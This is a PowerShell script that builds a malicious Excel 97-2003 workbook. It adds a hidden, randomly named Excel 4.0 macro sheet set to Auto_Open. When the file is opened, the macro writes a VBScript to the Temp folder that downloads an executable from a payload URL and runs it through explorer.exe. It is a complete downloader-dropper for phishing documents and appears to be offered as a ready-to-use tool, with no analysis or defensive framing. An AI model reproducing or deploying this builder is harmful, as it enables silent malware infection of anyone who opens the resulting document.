Import-Module $PSScriptRoot\..\..\internals\utils.psm1

<#


#>
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    $xlApp = New-Object -COMObject "Excel.Application"
    $xlApp.Visible = $false
    $fname = "$PSScriptRoot\Book1.xls"

    # Cells.Item(ROW, COLUMN)
    $xlBook = $xlApp.workbooks.open($fname)
    $sheet = $xlApp.Excel4MacroSheets.Add()
    
    BuildMacro -sheet $sheet

    #Rename macro sheet
    $xlBook.Sheets("Macro1").Name = RandTextAlphanumeric(5)
    #Hide macro sheet. 0 for normal hide, 2 for super hide
    $sheet.Visible = 0
    #Switch focus to Sheet1, redundant if only Macro1 and Sheet1 exist
    $xlBook.Sheets("Sheet1").Select()

    # 56 is needed for 'Excel 97-2003 Workbook'
    # https://docs.microsoft.com/en-us/office/vba/api/Excel.XlFileFormat
    if (!$pass) {
        $xlBook.SaveAs($out, 56)
        $xlBook.Close()
        $xlApp.Quit()
    } else {
        $xlBook.SaveAs($out, 56, $pass)
        $xlBook.Close()
        $xlApp.Quit()
    }

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable xlBook
    Remove-Variable xlApp

}

function BuildMacro() {
    param(
        [Parameter(mandatory=$true)]
        [System.Object]
        $sheet
    )

    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")

    $sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)"
    $sheet.Cells.Item(2,1) = "=CHAR(RANDBETWEEN(97,122))&CHAR(RANDBETWEEN(97,122))&CHAR(RANDBETWEEN(97,122))&RANDBETWEEN(100,999)&`".exe`""
    $sheet.Cells.Item(3,1) = "=CHAR(RANDBETWEEN(97,122))&CHAR(RANDBETWEEN(97,122))&CHAR(RANDBETWEEN(97,122))&RANDBETWEEN(100,999)&`".vbs`""
    $sheet.Cells.Item(4,1) = "=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)"
    $sheet.Cells.Item(5,1) = "=FOPEN(`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`", 3)"
    $sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url = `"`"$payload`"`"`")"
    $sheet.Cells.Item(7,1) = "=FWRITELN(A5, `"`")"
    $sheet.Cells.Item(8,1) = "=FWRITELN(A5, `"Set winHttp = CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")"
    $sheet.Cells.Item(9,1) = "=FWRITELN(A5, `"winHttp.Open `"`"GET`"`", url, False`")"
    $sheet.Cells.Item(10,1) = "=FWRITELN(A5, `"winHttp.Send`")"
    $sheet.Cells.Item(11,1) = "=FWRITELN(A5, `"If winHttp.Status = 200 Then`")"
    $sheet.Cells.Item(12,1) = "=FWRITELN(A5, `"Set oStream = CreateObject(`"`"ADODB.Stream`"`")`")"
    $sheet.Cells.Item(13,1) = "=FWRITELN(A5, `"oStream.Open`")"
    $sheet.Cells.Item(14,1) = "=FWRITELN(A5, `"oStream.Type = 1`")"
    $sheet.Cells.Item(15,1) = "=FWRITELN(A5, `"oStream.Write winHttp.responseBody`")"
    $sheet.Cells.Item(16,1) = "=FWRITELN(A5, `"oStream.SaveToFile `"`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`"`", 2`")"
    $sheet.Cells.Item(17,1) = "=FWRITELN(A5, `"oStream.Close`")"
    $sheet.Cells.Item(18,1) = "=FWRITELN(A5, `"End If`")"
    $sheet.Cells.Item(19,1) = "=FCLOSE(A5)"
    $sheet.Cells.Item(20,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`")"
    $sheet.Cells.Item(21,1) = "=WAIT(NOW()+`"00:00:05`")"
    $sheet.Cells.Item(22,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`")"
    $sheet.Cells.Item(23,1) = "=HALT()"


    $sheet.Cells.Item(1,1).Name = "Auto_Open"

    
}